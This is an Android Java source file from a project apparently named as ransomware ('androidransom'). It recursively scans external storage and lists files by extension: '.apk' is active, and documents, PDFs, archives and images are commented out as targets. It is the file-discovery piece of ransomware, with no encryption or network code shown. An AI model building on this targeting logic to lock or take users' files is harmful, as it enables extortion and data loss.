package bycracks.androidransom;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by raven on 2017-05-17.
 */

public class SubActivity extends Activity {
    String[] ext = {".apk"/*, ".txt", ".pdf", ".zip", ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
    ArrayList <String> myList = new ArrayList<String>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sub);


        String rootSD = Environment.getRootDirectory().toString();
        File f = new File(rootSD + "/../storage/emulated/0/");
        searchAllFile(f);

        ListView listview = (ListView) findViewById(R.id.list);
        listview.setAdapter(new ArrayAdapter<String>(SubActivity.this, android.R.layout.simple_list_item_1,myList));

    }


    public void searchAllFile(File fileList){
        File[] files = fileList.listFiles();
        if (files == null)
            return;

        for(File inFile : files) {
            if (inFile.isDirectory()) {
                searchAllFile(inFile);
            }
            for (String list : ext)
                if (inFile.getName().endsWith(list)) {
                    myList.add(inFile.getName());
                }

        }
    }

}
